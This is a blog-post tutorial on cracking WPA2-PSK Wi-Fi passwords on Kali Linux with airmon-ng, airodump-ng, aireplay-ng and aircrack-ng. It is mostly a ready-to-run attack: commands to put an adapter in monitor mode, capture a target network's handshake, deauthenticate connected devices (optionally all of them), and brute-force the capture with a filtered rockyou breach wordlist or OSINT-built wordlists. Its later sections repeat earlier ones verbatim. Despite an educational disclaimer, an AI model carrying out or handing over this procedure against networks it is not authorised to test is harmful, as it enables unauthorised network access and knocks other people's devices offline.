---
title: "How to Crack WPA2 Wi-Fi Passwords"
classes: wide
header:
  teaser: /assets/images/Wifi-Hacking/logo.png
  overlay_image: /assets/images/Wifi-Hacking/logo.png
  overlay_filter: 0.5
ribbon: OliveDrab
excerpt: "Discovering WPA2 Wi-Fi passwords on Linux using airodump-ng, airmon-ng, and aircrack-ng."
description: "Discovering WPA2 Wi-Fi passwords on Linux using airodump-ng, airmon-ng, and aircrack-ng"
categories:
  - Wi-fi Hacking
tags:
  - Wi-fi
  - WPA2
  - Linux
toc: true
toc_sticky: true
toc_label: "On This Blog"
toc_icon: "biohazard"
---

# Intro
In this post, I will demonstrate, for educational purposes only, how to uncover the password of a WPA2-PSK Wi-Fi network. Please note that performing such actions without explicit authorization from the network owner is illegal and may result in serious consequences. This content is intended solely for ethical hacking and security research.

# Requirements
To get started, you’ll need a USB Wi-Fi adapter that supports monitor mode. This is necessary if your built-in network card does not support monitor mode or if you are using a virtual machine, as most virtual machines cannot access built-in Wi-Fi cards directly. Additionally, you’ll need an environment running a Linux-based operating system; in this case, we’ll be using Kali Linux.

For this tutorial, I’m using the TP-Link USB 150Mbps TL-WN722N Wireless Adapter, which supports monitor mode. However, keep in mind that this adapter only works on 2.4GHz networks, so it won’t be able to capture traffic or perform operations on 5GHz networks.

# Understanding Wi-Fi and WPA2
Before we begin, it’s important to clarify some key concepts:

Wi-Fi relies on encryption protocols to secure the communication. These protocols have evolved over time, starting with WEP (Wired Equivalent Privacy), followed by WPA (Wi-Fi Protected Access), WPA2, and the latest, WPA3.

Currently, the most widely used standard is WPA2, an updated version of WPA. WPA2 is based on the Robust Security Network (RSN) mechanism and operates in two modes:

 - WPA2-PSK (Pre-Shared Key): Commonly used in home environments.
 - WPA2-EAP (Extensible Authentication Protocol): Designed for organizational or enterprise use.  

In this post, we focus on WPA2-PSK, which uses a process called the 4-Way Handshake to establish a secure connection. During this handshake, the router and client verify they share the same password and generate encryption keys. While the actual password is not transmitted, the handshake contains a hash of the password, which can be intercepted and brute-forced to discover the key.

<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/wpa-4-way-handshake-workflow.png" alt="4-Way Handshake Diagram">
</div>
<br>

# How the Attack Works

For better understanding, here’s a brief theoretical explanation:

- [**Set up the environment**](#set-up-the-environment): We will configure the virtual machine to recognize the Wi-Fi adapter and enable monitor mode, allowing us to capture wireless traffic.
- [**Listen to nearby networks**](#listen-to-nearby-networks): We will use tools to "listen" to nearby networks and identify our target.
- [**Deauthenticate a device from the network**](#deauthenticate-a-device-from-the-network): We will send deauthentication packets to force a connected device to disconnect from the network.
- [**Capture the handshake**](#capture-the-handshake): When the device reconnects, we will intercept the WPA2 handshake, which contains the hash of the password.
- [**Perform brute force on the hash**](#perform-brute-force-on-the-hash): With the handshake captured, we will perform a brute force attack on the hash to try to discover the password.




## Set up the environment
First, connect the USB adapter to your computer or laptop.
Add the adapter to the input devices of your virtual machine; in this case, I am using VirtualBox.
<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/vb_config.png" alt="4-Way Handshake Diagram">
</div>

<br>
Select your adapter from the list of USB devices.


<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/vb_select.png" alt="4-Way Handshake Diagram">
</div>
<br>
After adding it, click OK and start your virtual machine.

<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/vb_ok.png" alt="4-Way Handshake Diagram">
</div>


### Monitor Mode

To enable monitor mode, you first need to install the wireless device driver:

```bash
apt install realtek-rtl88xxau-dkms
```

<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_install_drive.png" alt="4-Way Handshake Diagram">
</div>
<br>
Once the driver is installed, verify if Kali Linux detects the wireless adapter using the following command:
```bash
iwconfig
```

<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_iwconfig.png" alt="4-Way Handshake Diagram">
</div>
<br>
As shown in the output, the "wlan0" interface is now active and ready for use.

Next, we need to check and stop any processes that could interfere with enabling monitor mode. Use the following commands:
```bash
airmon-ng check
airmon-ng check kill
```
<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_airmonCheck.png" alt="4-Way Handshake Diagram">
</div>
<br>

Now, we can enable monitor mode on our adapter with the following command:

```bash
airmon-ng start wlan0
```
<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_airmonStart.png" alt="4-Way Handshake Diagram">
</div>
<br>

To verify if monitor mode is active, you can use the following command:

```bash
iwconfig wlan0
```
<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_iwconfig_monitorMode.png" alt="4-Way Handshake Diagram">
</div>
<br>

## Listen to nearby networks
Using the following command, we will list all the nearby networks that the adapter can detect:

```bash
airodump-ng wlan0  
```
<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_airodump.png" alt="4-Way Handshake Diagram">
</div>
<br>
<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_airodumpResults.png" alt="4-Way Handshake Diagram">
</div>
<br>

To analyze the results, it's important to understand the following fields:

| **Field** | **Description** |
|-----------|-----------------|
| **BSSID** | The MAC address of the access point |
| **ENC**   | The encryption algorithm used (e.g., WPA2). This is discussed in the topic [Understanding Wi-Fi and WPA2](#understanding-wi-fi-and-wpa2). For this example, we are focusing on WPA2 networks. |
| **AUTH**  | The authentication protocol. As noted earlier, WPA2 networks typically display "PSK" for "Pre-Shared Key," which is common in residential environments. |
| **ESSID** | The name of the wireless network |


For more detailed information about **airodump-ng**, you can check [here.](https://www.aircrack-ng.org/doku.php?id=airodump-ng)


**Note:** It is possible that the network you are targeting does not broadcast its name (ESSID). In this case, the following command can be used to detect hidden networks:
```bash
airodump-ng wlan0 --essid ""
```

In this test, the network **"EverHouse 2.4"** will be our target:
<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_everhouse.png" alt="Target Network: EverHouse 2.4">
</div>

Next, we will capture the packets going to the chosen network and save the data in a file, which will store the handshake hash for further cracking:

```bash
airodump-ng wlan0 -d <BSSID> -c 5 -w wifi_testing
```

<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_everhouseCommand.png" alt="Airodump-ng Command to Capture Packets">
</div>  
<br>  
<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_everhouseResults.png" alt="Airodump-ng Results">
</div>  
<br>
At this point, no handshake (connection establishment between a user and the network) has been captured yet. To force a handshake, we will deauthenticate a user from the network and intercept the handshake in the next step.

## **Deauthenticate a Device from the Network**

In the previous output, the bottom section lists the devices connected to the Wi-Fi network specified by the BSSID. The **"STATION"** field represents the MAC address of each connected device, and we will use it to specify which device we want to deauthenticate. Open a new terminal and use the following command:

```bash
sudo aireplay-ng --deauth 0 -a <BSSID> -c <MAC> wlan0
```

I checked the MAC address of my device in the Wi-Fi settings to specify which device I wanted to disconnect from the network:
<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_deauthError.png" alt="Deauthentication Error">
</div>
<br>
However, during my tests, I encountered the error shown above. To resolve this, I returned to the terminal monitoring the target network and added the flag `--channel 4` to lock the channel:

```bash
airodump-ng --channel 4 wlan0 -d <BSSID> -c 5 -w wifi_testing
```

**Note:** If you need to perform this step, remember to delete the unused files generated earlier. In my case, I used the command:
```bash
rm *
```
(This was safe because the directory only contained files from this test.)

<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_airodumpChannel4.png" alt="Channel Lock Fix">
</div>
<br>
After making this adjustment, the deauthentication command worked correctly:

<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_deauthSuccess.png" alt="Deauthentication Successful">
</div>
<br>
At this point, I observed that my device was disconnected from the network.

> **Observation:** If you do not specify a MAC address, you can deauthenticate all devices on that network. However, being able to deauthenticate a user from the network is considered a security vulnerability. Some networks may have protections in place to prevent this kind of attack, making it ineffective in those cases.

## **Capture the Handshake**

When I reconnected my device to the network, **airodump-ng** successfully captured the handshake. You can confirm this when the handshake appears in the top-right corner of the terminal, as highlighted in the image below:

<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_airodump_handshake.png" alt="Handshake Captured">
</div>

## Perform brute force on the hash
At this point, you no longer need to stay near the network to crack the password. Brute force can take hours or even days depending on the scenario and the strength of the password, so you could go home and let the process run.

Now that we have intercepted the handshake, we can list the files generated by **airodump-ng** with ```ls```.

The file with the `.cap` extension contains the hash of the password that we will brute force.

<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_ls.png" alt="Handshake Captured">
</div>
<br>
We will use a wordlist already available in Kali called **rockyou.txt**, which originates from a data breach in 2009. To optimize the brute force process, we will filter this list to include only words with 8 to 63 characters (the standard for WPA passwords). Use the following command:

```bash
pw-inspector -i /usr/share/wordlists/rockyou.txt -o optimized.txt -m 8 -M 63
```

<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_pwinspector.png" alt="Handshake Captured">
</div>

For demonstration purposes, I will add the correct password to the beginning of the file.

Now, we will perform a brute force attack using the wordlist and the `.cap` file:

```bash
aircrack-ng -w optimized.txt ./wifi_testing-01.cap 
```
<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_bruteforce.png" alt="Handshake Captured">
</div>
<br>
<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_bruteforce_result.png" alt="Handshake Captured">
</div>

## **Customizing Wordlist**

One problem that may occur is that the password is not included in the wordlist. This is why "weak" and common passwords are easier to crack. Considering this, to maximize the chances of finding the password, the suggestion is to create a wordlist based on OSINT (Open Source Intelligence) performed on the target, such as searching for publicly available information on social media.

### Example Repositories to Generate a Custom Wordlist
- [Cupp](https://github.com/Mebus/cupp)
- [CuppBR (for Brazil)](https://github.com/Rfarias1734/cuppbr)


## Summary of Commands

```bash
# Install the driver required for enabling monitor mode on your adapter
apt install realtek-rtl88xxau-dkms

# Check the current wireless configuration and verify interface status
iwconfig

# Identify processes that may interfere with enabling monitor mode
airmon-ng check

# Kill interfering processes to prepare the adapter for monitor mode
airmon-ng check kill

# Start monitor mode on the specified wireless interface
airmon-ng start wlan0

# Verify that the adapter is now in monitor mode
iwconfig wlan0

# Scan for nearby wireless networks and display details
airodump-ng wlan0  

# Detect hidden networks (those without an ESSID)
airodump-ng wlan0 --essid ""

# Capture packets from a specific network and save them to a file
airodump-ng wlan0 -d <BSSID> -c 5 -w wifi_testing

# Send deauthentication packets to disconnect a device from the network
sudo aireplay-ng --deauth 0 -a <BSSID> -c <MAC> wlan0

# Optimize the wordlist by filtering based on WPA password length
pw-inspector -i /usr/share/wordlists/rockyou.txt -o optimized.txt -m 8 -M 63

# Perform brute force on the handshake file
aircrack-ng -w optimized.txt ./wifi_testing-01.cap 
```

## **Capture the Handshake**

When I reconnected my device to the network, **airodump-ng** successfully captured the handshake. You can confirm this when the handshake appears in the top-right corner of the terminal, as highlighted in the image below:

<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_airodump_handshake.png" alt="Handshake Captured">
</div>

## **Perform Brute Force on the Hash**

Now that we have intercepted the handshake, we can list the files generated by **airodump-ng**:

```bash
ls
```

The file with the `.cap` extension contains the hash of the password that we will brute force.

<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_ls.png" alt="Handshake Captured">
</div>

We will use a wordlist already available in Kali called **rockyou.txt**, which originates from a data breach in 2009. To optimize the brute force process, we will filter this list to include only words with 8 to 63 characters (the standard for WPA passwords). Use the following command:

```bash
pw-inspector -i /usr/share/wordlists/rockyou.txt -o optimized.txt -m 8 -M 63
```

<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_pwinspector.png" alt="Filtered Wordlist">
</div>

For demonstration purposes, I will add the correct password to the beginning of the file.

Now, we will perform a brute force attack using the wordlist and the `.cap` file:

```bash
aircrack-ng -w optimized.txt ./wifi_testing-01.cap 
```

<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_bruteforce.png" alt="Brute Force Command">
</div>
<br>
<div style="text-align: center;">
  <img src="/assets/images/Wifi-Hacking/kali_bruteforce_result.png" alt="Brute Force Result">
</div>

## **Customizing Wordlist**

One problem that may occur is that the password is not included in the wordlist. This is why "weak" and common passwords are easier to crack. Considering this, to maximize the chances of finding the password, the suggestion is to create a wordlist based on OSINT (Open Source Intelligence) performed on the target, such as searching for publicly available information on social media.

### Example Repositories to Generate a Custom Wordlist
- [Cupp](https://github.com/Mebus/cupp)
- [CuppBR (for Brazil)](https://github.com/Rfarias1734/cuppbr)

# **Summary of Commands**

```bash
# Install the driver required for enabling monitor mode on your adapter
apt install realtek-rtl88xxau-dkms

# Check the current wireless configuration and verify interface status
iwconfig

# Identify processes that may interfere with enabling monitor mode
airmon-ng check

# Kill interfering processes to prepare the adapter for monitor mode
airmon-ng check kill

# Start monitor mode on the specified wireless interface
airmon-ng start wlan0

# Verify that the adapter is now in monitor mode
iwconfig wlan0

# Scan for nearby wireless networks and display details
airodump-ng wlan0  

# Detect hidden networks (those without an ESSID)
airodump-ng wlan0 --essid ""

# Capture packets from a specific network and save them to a file
airodump-ng wlan0 -d <BSSID> -c 5 -w wifi_testing

# Send deauthentication packets to disconnect a device from the network
sudo aireplay-ng --deauth 0 -a <BSSID> -c <MAC> wlan0

# Optimize the wordlist by filtering based on WPA password length
pw-inspector -i /usr/share/wordlists/rockyou.txt -o optimized.txt -m 8 -M 63

# Perform brute force on the handshake file
aircrack-ng -w optimized.txt ./wifi_testing-01.cap 
```

# **Credits**

This post was created with the intent of sharing knowledge in the field of information security. To achieve this, information from various sources that provided incredible content was compiled:

- [What is WEP, WPA, WPA2, WPA3? Differences and Wi-Fi Security Protocols](https://tecnoblog.net/responde/o-que-e-wep-wpa-wpa2-wpa3-diferencas-protocolo-seguranca-wi-fi/)  
- [Aircrack-ng Airodump-ng Documentation](https://www.aircrack-ng.org/doku.php?id=airodump-ng)  
- [YouTube Tutorial on WPA2 Hacking](https://www.youtube.com/watch?v=WfYxrLaqlN8)  
- [RedFoxSec Blog - Wi-Fi Hacking (Part 1)](https://redfoxsec.com/blog/wi-fi-hacking-part-1/)  
- [Understanding RockYou.txt - Keeper Security](https://www.keepersecurity.com/blog/pt-br/2023/08/04/understanding-rockyou-txt-a-tool-for-security-and-a-weapon-for-hackers/)  
- [WPA and WPA2 4-Way Handshake Explanation](https://networklessons.com/wireless/wpa-and-wpa2-4-way-handshake)


